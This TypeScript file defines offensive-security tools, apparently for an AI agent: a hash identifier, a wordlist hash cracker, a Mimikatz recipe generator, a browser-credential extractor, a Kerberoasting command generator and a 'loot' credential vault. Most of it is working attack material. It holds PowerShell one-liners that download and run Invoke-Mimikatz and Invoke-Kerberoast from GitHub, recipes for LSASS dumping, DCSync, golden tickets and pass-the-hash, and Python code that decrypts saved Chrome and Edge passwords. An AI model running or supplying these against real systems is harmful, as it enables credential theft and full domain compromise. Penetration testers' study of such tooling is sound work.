import { Tool } from './Tool.js';
import * as crypto from 'crypto';
import * as fs from 'fs';
import * as readline from 'readline';
import { getLootStore } from '../core/LootStore.js';

// ─── 1. Hash Identifier ─────────────────────────────────────────────────────────
export class HashIdentifyTool implements Tool {
    name = 'hash_identify';
    description = 'Auto-detect hash type by length, charset, and prefix patterns. Returns detected type and Hashcat mode.';
    schema = {
        type: 'object',
        properties: {
            hash: { type: 'string', description: 'Hash string to identify' }
        },
        required: ['hash'],
        additionalProperties: false
    };

    async execute(args: { hash: string }): Promise<string> {
        const h = args.hash.trim();
        const results: { type: string; mode: number; confidence: string }[] = [];

        // Prefix-based detection
        if (h.startsWith('$2b$') || h.startsWith('$2a$') || h.startsWith('$2y$')) results.push({ type: 'bcrypt', mode: 3200, confidence: 'high' });
        if (h.startsWith('$6$')) results.push({ type: 'SHA-512 crypt (Unix)', mode: 1800, confidence: 'high' });
        if (h.startsWith('$5$')) results.push({ type: 'SHA-256 crypt (Unix)', mode: 7400, confidence: 'high' });
        if (h.startsWith('$1$')) results.push({ type: 'MD5 crypt (Unix)', mode: 500, confidence: 'high' });
        if (h.startsWith('$apr1$')) results.push({ type: 'Apache MD5', mode: 1600, confidence: 'high' });
        if (h.startsWith('$krb5tgs$')) results.push({ type: 'Kerberos TGS-REP (Kerberoast)', mode: 13100, confidence: 'high' });
        if (h.startsWith('$krb5asrep$')) results.push({ type: 'Kerberos AS-REP (ASREPRoast)', mode: 18200, confidence: 'high' });
        if (h.startsWith('$DCC2$')) results.push({ type: 'Domain Cached Credentials 2', mode: 2100, confidence: 'high' });
        if (h.startsWith('$argon2')) results.push({ type: 'Argon2', mode: -1, confidence: 'high' });

        // Length-based detection (hex hashes)
        const isHex = /^[a-fA-F0-9]+$/.test(h);
        if (isHex) {
            if (h.length === 32) {
                results.push({ type: 'MD5', mode: 0, confidence: 'medium' });
                results.push({ type: 'NTLM', mode: 1000, confidence: 'medium' });
                results.push({ type: 'MD4', mode: 900, confidence: 'low' });
            }
            if (h.length === 40) results.push({ type: 'SHA-1', mode: 100, confidence: 'medium' });
            if (h.length === 64) {
                results.push({ type: 'SHA-256', mode: 1400, confidence: 'medium' });
                results.push({ type: 'HMAC-SHA256', mode: 1450, confidence: 'low' });
            }
            if (h.length === 128) results.push({ type: 'SHA-512', mode: 1700, confidence: 'medium' });
            if (h.length === 96) results.push({ type: 'SHA-384', mode: 10800, confidence: 'medium' });
        }

        // NTLMv2 / NetNTLMv2 pattern (contains ::)
        if (h.includes('::')) {
            results.push({ type: 'NetNTLMv2', mode: 5600, confidence: 'high' });
        }

        // LM hash (32 hex, often paired)
        if (isHex && h.length === 32 && h.toUpperCase() === h) {
            results.push({ type: 'LM', mode: 3000, confidence: 'low' });
        }

        if (results.length === 0) {
            return `[HASH IDENTIFY] Unable to identify hash type for: ${h.slice(0, 64)}...`;
        }

        const lines = [`[HASH IDENTIFY] ${h.slice(0, 64)}${h.length > 64 ? '...' : ''}`, ''];
        results.sort((a, b) => {
            const conf = { high: 0, medium: 1, low: 2 };
            return (conf[a.confidence as keyof typeof conf] ?? 3) - (conf[b.confidence as keyof typeof conf] ?? 3);
        });
        for (const r of results) {
            lines.push(`  ${r.confidence.toUpperCase().padEnd(6)} ${r.type.padEnd(35)} Hashcat mode: ${r.mode >= 0 ? r.mode : 'N/A'}`);
        }
        return lines.join('\n');
    }
}

// ─── 2. Hash Cracker ────────────────────────────────────────────────────────────
export class HashCrackTool implements Tool {
    name = 'hash_crack';
    description = 'Dictionary attack against hashes using native crypto. Supports MD5, SHA1, SHA256, SHA512, NTLM.';
    schema = {
        type: 'object',
        properties: {
            hash: { type: 'string', description: 'Hash to crack' },
            hashType: { type: 'string', enum: ['md5', 'sha1', 'sha256', 'sha512', 'ntlm'], description: 'Hash algorithm' },
            wordlistPath: { type: 'string', description: 'Path to wordlist file' }
        },
        required: ['hash', 'hashType', 'wordlistPath'],
        additionalProperties: false
    };

    async execute(args: { hash: string; hashType: string; wordlistPath: string }): Promise<string> {
        const targetHash = args.hash.toLowerCase().trim();

        if (!fs.existsSync(args.wordlistPath)) {
            return `[HASH CRACK ERROR]: Wordlist not found: ${args.wordlistPath}`;
        }

        const hashFunc = (candidate: string): string => {
            if (args.hashType === 'ntlm') {
                // NTLM = MD4(UTF-16LE(password))
                const buf = Buffer.from(candidate, 'utf16le');
                return crypto.createHash('md4').update(buf).digest('hex');
            }
            return crypto.createHash(args.hashType).update(candidate).digest('hex');
        };

        const stream = fs.createReadStream(args.wordlistPath, 'utf-8');
        const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });

        let count = 0;
        const maxCandidates = 1_000_000;
        const startTime = Date.now();

        for await (const line of rl) {
            if (count >= maxCandidates) break;
            const candidate = line.trim();
            if (!candidate) continue;
            count++;

            try {
                if (hashFunc(candidate) === targetHash) {
                    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
                    rl.close();
                    stream.destroy();
                    return [
                        `[HASH CRACK] CRACKED`,
                        `Hash:      ${targetHash}`,
                        `Type:      ${args.hashType.toUpperCase()}`,
                        `Plaintext: ${candidate}`,
                        `Attempts:  ${count.toLocaleString()}`,
                        `Time:      ${elapsed}s`,
                    ].join('\n');
                }
            } catch { continue; }
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
        return [
            `[HASH CRACK] NOT FOUND`,
            `Hash:     ${targetHash}`,
            `Type:     ${args.hashType.toUpperCase()}`,
            `Attempts: ${count.toLocaleString()} / ${maxCandidates.toLocaleString()} max`,
            `Time:     ${elapsed}s`,
            `Wordlist: ${args.wordlistPath}`,
        ].join('\n');
    }
}

// ─── 3. Mimikatz Command Generator ─────────────────────────────────────────────
export class MimikatzCommandTool implements Tool {
    name = 'mimikatz_command';
    description = 'Generate Mimikatz commands and PowerShell execution one-liners. Does NOT execute — returns the command.';
    schema = {
        type: 'object',
        properties: {
            recipe: { type: 'string', enum: ['logonpasswords', 'sam_dump', 'dcsync', 'golden_ticket', 'silver_ticket', 'kerberos_list', 'dpapi_cred', 'lsadump_lsa', 'pth', 'custom'], description: 'Pre-built recipe' },
            customCommand: { type: 'string', description: 'Custom mimikatz command (when recipe is "custom")' },
            target: { type: 'string', description: 'Target domain/user for dcsync, golden_ticket, etc.' },
            domain: { type: 'string', description: 'Domain name' },
            ntlm_hash: { type: 'string', description: 'NTLM hash for pth' },
            username: { type: 'string', description: 'Username for pth/dcsync' }
        },
        required: ['recipe'],
        additionalProperties: false
    };

    async execute(args: { recipe: string; customCommand?: string; target?: string; domain?: string; ntlm_hash?: string; username?: string }): Promise<string> {
        const recipes: Record<string, { cmd: string; description: string }> = {
            logonpasswords: {
                cmd: 'privilege::debug\nsekurlsa::logonpasswords',
                description: 'Dump credentials from LSASS memory'
            },
            sam_dump: {
                cmd: 'privilege::debug\ntoken::elevate\nlsadump::sam',
                description: 'Dump SAM database (local account hashes)'
            },
            dcsync: {
                cmd: `privilege::debug\nlsadump::dcsync /domain:${args.domain || 'DOMAIN'} /user:${args.username || args.target || 'krbtgt'}`,
                description: 'DCSync attack — replicate DC to extract hashes'
            },
            golden_ticket: {
                cmd: `privilege::debug\nkerberos::golden /user:${args.username || 'Administrator'} /domain:${args.domain || 'DOMAIN'} /sid:S-1-5-21-XXXXXXXXXX /krbtgt:${args.ntlm_hash || 'NTLM_HASH'} /ptt`,
                description: 'Create Golden Ticket for domain persistence'
            },
            silver_ticket: {
                cmd: `privilege::debug\nkerberos::golden /user:${args.username || 'Administrator'} /domain:${args.domain || 'DOMAIN'} /sid:S-1-5-21-XXXXXXXXXX /target:${args.target || 'TARGET_SPN'} /rc4:${args.ntlm_hash || 'SERVICE_NTLM'} /service:cifs /ptt`,
                description: 'Create Silver Ticket for service access'
            },
            kerberos_list: {
                cmd: 'privilege::debug\nkerberos::list',
                description: 'List cached Kerberos tickets'
            },
            dpapi_cred: {
                cmd: 'privilege::debug\nsekurlsa::dpapi\ndpapi::cred',
                description: 'Extract DPAPI credentials'
            },
            lsadump_lsa: {
                cmd: 'privilege::debug\ntoken::elevate\nlsadump::lsa /patch',
                description: 'Dump LSA secrets'
            },
            pth: {
                cmd: `privilege::debug\nsekurlsa::pth /user:${args.username || 'Administrator'} /domain:${args.domain || '.'} /ntlm:${args.ntlm_hash || 'NTLM_HASH'}`,
                description: 'Pass-the-Hash authentication'
            },
            custom: {
                cmd: args.customCommand || 'privilege::debug',
                description: 'Custom mimikatz command'
            }
        };

        const recipe = recipes[args.recipe];
        if (!recipe) return `[ERROR]: Unknown recipe "${args.recipe}"`;

        // PowerShell one-liner version
        const psOneLiner = `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '${recipe.cmd.replace(/\n/g, ' ; ')}'\"`;

        return [
            `[MIMIKATZ — ${args.recipe.toUpperCase()}]`,
            `Description: ${recipe.description}`,
            '',
            '── Direct Mimikatz ──',
            recipe.cmd,
            '',
            '── PowerShell One-Liner ──',
            psOneLiner,
        ].join('\n');
    }
}

// ─── 4. Token Extract ───────────────────────────────────────────────────────────
export class TokenExtractTool implements Tool {
    name = 'token_extract';
    description = 'Generate commands to locate and extract browser cookies, saved passwords, and tokens.';
    schema = {
        type: 'object',
        properties: {
            browser: { type: 'string', enum: ['chrome', 'edge', 'firefox'], description: 'Target browser' },
            platform: { type: 'string', enum: ['windows', 'linux', 'macos'], description: 'Target OS' }
        },
        required: ['browser', 'platform'],
        additionalProperties: false
    };

    async execute(args: { browser: string; platform: string }): Promise<string> {
        const paths: Record<string, Record<string, { cookies: string; logins: string; localState: string }>> = {
            chrome: {
                windows: { cookies: '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies', logins: '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data', localState: '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State' },
                linux: { cookies: '~/.config/google-chrome/Default/Cookies', logins: '~/.config/google-chrome/Default/Login Data', localState: '~/.config/google-chrome/Local State' },
                macos: { cookies: '~/Library/Application Support/Google/Chrome/Default/Cookies', logins: '~/Library/Application Support/Google/Chrome/Default/Login Data', localState: '~/Library/Application Support/Google/Chrome/Local State' }
            },
            edge: {
                windows: { cookies: '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies', logins: '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data', localState: '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State' },
                linux: { cookies: '~/.config/microsoft-edge/Default/Cookies', logins: '~/.config/microsoft-edge/Default/Login Data', localState: '~/.config/microsoft-edge/Local State' },
                macos: { cookies: '~/Library/Application Support/Microsoft Edge/Default/Cookies', logins: '~/Library/Application Support/Microsoft Edge/Default/Login Data', localState: '~/Library/Application Support/Microsoft Edge/Local State' }
            },
            firefox: {
                windows: { cookies: '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite', logins: '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json', localState: '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db' },
                linux: { cookies: '~/.mozilla/firefox/*.default-release/cookies.sqlite', logins: '~/.mozilla/firefox/*.default-release/logins.json', localState: '~/.mozilla/firefox/*.default-release/key4.db' },
                macos: { cookies: '~/Library/Application Support/Firefox/Profiles/*.default-release/cookies.sqlite', logins: '~/Library/Application Support/Firefox/Profiles/*.default-release/logins.json', localState: '~/Library/Application Support/Firefox/Profiles/*.default-release/key4.db' }
            }
        };

        const p = paths[args.browser]?.[args.platform];
        if (!p) return `[ERROR]: Unsupported browser/platform combo`;

        const lines = [
            `[TOKEN EXTRACT — ${args.browser.toUpperCase()} on ${args.platform.toUpperCase()}]`,
            '',
            'Database Locations:',
            `  Cookies:     ${p.cookies}`,
            `  Logins:      ${p.logins}`,
            `  Local State: ${p.localState}`,
            '',
            '── Extraction Commands ──',
        ];

        if (args.browser !== 'firefox') {
            lines.push(
                '',
                '# 1. Copy databases (close browser first)',
                `copy "${p.cookies}" .\\cookies.db`,
                `copy "${p.logins}" .\\logins.db`,
                `copy "${p.localState}" .\\local_state.json`,
                '',
                '# 2. Query cookies (SQLite3)',
                'sqlite3 cookies.db "SELECT host_key, name, encrypted_value FROM cookies LIMIT 50;"',
                '',
                '# 3. Query saved passwords',
                'sqlite3 logins.db "SELECT origin_url, username_value, password_value FROM logins;"',
                '',
                '# 4. Decrypt (requires DPAPI master key from Local State)',
                '# The encrypted_value / password_value blobs are AES-GCM encrypted',
                '# Key is in Local State JSON under os_crypt.encrypted_key (base64, DPAPI-protected)',
                '',
                '# Python decryption (requires pywin32 on Windows):',
                'python3 -c "',
                'import json, base64, sqlite3',
                'from Cryptodome.Cipher import AES',
                'import win32crypt',
                '',
                'with open(\'local_state.json\') as f:',
                '    key = base64.b64decode(json.load(f)[\'os_crypt\'][\'encrypted_key\'])[5:]',
                '    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]',
                '',
                'db = sqlite3.connect(\'logins.db\')',
                'for row in db.execute(\'SELECT origin_url, username_value, password_value FROM logins\'):',
                '    iv = row[2][3:15]',
                '    payload = row[2][15:-16]',
                '    tag = row[2][-16:]',
                '    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)',
                '    print(row[0], row[1], cipher.decrypt_and_verify(payload, tag).decode())',
                '"',
            );
        } else {
            lines.push(
                '',
                '# Firefox uses NSS for encryption',
                '# 1. Copy the profile directory',
                `copy "${p.cookies}" .\\cookies.sqlite`,
                `copy "${p.logins}" .\\logins.json`,
                `copy "${p.localState}" .\\key4.db`,
                '',
                '# 2. Query cookies',
                'sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies LIMIT 50;"',
                '',
                '# 3. Decrypt logins (requires NSS or tools like firefox_decrypt)',
                '# pip install firefox-decrypt',
                '# python -m firefox_decrypt ~/.mozilla/firefox/*.default-release/',
            );
        }

        return lines.join('\n');
    }
}

// ─── 5. Kerberoast Tool ─────────────────────────────────────────────────────────
export class KerberoastTool implements Tool {
    name = 'kerberoast';
    description = 'Generate Kerberoasting commands for SPN enumeration and TGS request extraction.';
    schema = {
        type: 'object',
        properties: {
            domain: { type: 'string', description: 'Target domain' },
            dc: { type: 'string', description: 'Domain controller IP (optional)' },
            method: { type: 'string', enum: ['impacket', 'rubeus', 'powershell'], description: 'Tool to use' }
        },
        required: ['domain', 'method'],
        additionalProperties: false
    };

    async execute(args: { domain: string; dc?: string; method: string }): Promise<string> {
        const { domain, dc, method } = args;
        const dcFlag = dc ? ` -dc-ip ${dc}` : '';

        const commands: Record<string, string[]> = {
            impacket: [
                `# Impacket GetUserSPNs — enumerate SPNs and request TGS tickets`,
                `impacket-GetUserSPNs ${domain}/username:password${dcFlag} -request -outputfile kerberoast.txt`,
                ``,
                `# With NTLM hash instead of password:`,
                `impacket-GetUserSPNs ${domain}/username -hashes :NTLM_HASH${dcFlag} -request -outputfile kerberoast.txt`,
                ``,
                `# Output format: Hashcat mode 13100 ($krb5tgs$23$*)`,
                `hashcat -m 13100 kerberoast.txt wordlist.txt`,
            ],
            rubeus: [
                `# Rubeus — Kerberoast all SPNs`,
                `Rubeus.exe kerberoast /outfile:kerberoast.txt`,
                ``,
                `# Target specific user:`,
                `Rubeus.exe kerberoast /user:svc_account /outfile:kerberoast.txt`,
                ``,
                `# Use RC4 (easier to crack):`,
                `Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.txt`,
                ``,
                `# Output format: Hashcat mode 13100`,
                `hashcat -m 13100 kerberoast.txt wordlist.txt`,
            ],
            powershell: [
                `# PowerShell — Enumerate SPNs`,
                `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name, ServicePrincipalName`,
                ``,
                `# Request TGS tickets (Invoke-Kerberoast from PowerSploit):`,
                `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')`,
                `Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | Out-File kerberoast.txt`,
                ``,
                `# Manual TGS request:`,
                `Add-Type -AssemblyName System.IdentityModel`,
                `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/target.${domain}"`,
                ``,
                `# Hashcat:`,
                `hashcat -m 13100 kerberoast.txt wordlist.txt`,
            ]
        };

        const cmds = commands[method];
        if (!cmds) return `[ERROR]: Unknown method "${method}"`;

        return [`[KERBEROAST — ${method.toUpperCase()}] Domain: ${domain}`, '', ...cmds].join('\n');
    }
}

// ─── 6. Loot Store Interface ────────────────────────────────────────────────────
export class LootStoreTool implements Tool {
    name = 'loot_store';
    description = 'Query, manage, and export the encrypted LootStore credential vault.';
    schema = {
        type: 'object',
        properties: {
            action: { type: 'string', enum: ['query', 'stats', 'export_json', 'export_hashcat'], description: 'Action to perform' },
            filter_target: { type: 'string', description: 'Filter by target (optional)' },
            filter_username: { type: 'string', description: 'Filter by username (optional)' }
        },
        required: ['action'],
        additionalProperties: false
    };

    async execute(args: { action: string; filter_target?: string; filter_username?: string }): Promise<string> {
        try {
            const store = getLootStore();
            switch (args.action) {
                case 'query':
                    return store.query({ target: args.filter_target, username: args.filter_username });
                case 'stats':
                    return store.getStats();
                case 'export_json':
                    return store.exportJson();
                case 'export_hashcat':
                    return store.exportHashcat() || '[LOOT STORE] No hashes in vault.';
                default:
                    return `[ERROR]: Unknown action "${args.action}"`;
            }
        } catch (e: any) {
            return `[LOOT STORE ERROR]: ${e.message}`;
        }
    }
}
